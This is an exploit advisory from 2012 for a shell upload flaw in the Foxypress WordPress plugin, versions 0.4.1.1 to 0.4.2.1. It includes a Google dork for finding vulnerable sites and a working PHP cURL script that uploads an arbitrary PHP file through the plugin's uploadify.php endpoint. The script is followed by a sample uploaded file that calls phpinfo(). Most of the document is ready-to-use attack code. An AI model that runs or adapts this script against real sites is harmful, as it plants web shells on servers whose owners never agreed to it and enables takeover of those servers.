##################################################
# Description : Wordpress Plugins - Foxypress Shell Upload Vulnerability
# Version : 0.4.1.1 - 0.4.2.1
# Link : http://wordpress.org/extend/plugins/foxypress/
# Plugins : http://downloads.wordpress.org/plugin/foxypress.zip
# Date : 26-05-2012
# Google Dork : inurl:/wp-content/plugins/foxypress/
# Author : Sammy FORGIT - sam at opensyscom dot fr - 
http://www.opensyscom.fr
##################################################


Exploit :

PostShell.php
<?php

$uploadfile="lo.php";
$ch = 
curl_init("http://www.exemple.com/wordpress/wp-content/plugins/foxypress/uploadify/uploadify.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
         array('Filedata'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>

Shell Access : $postResult output

lo.php
<?php
phpinfo();
?>

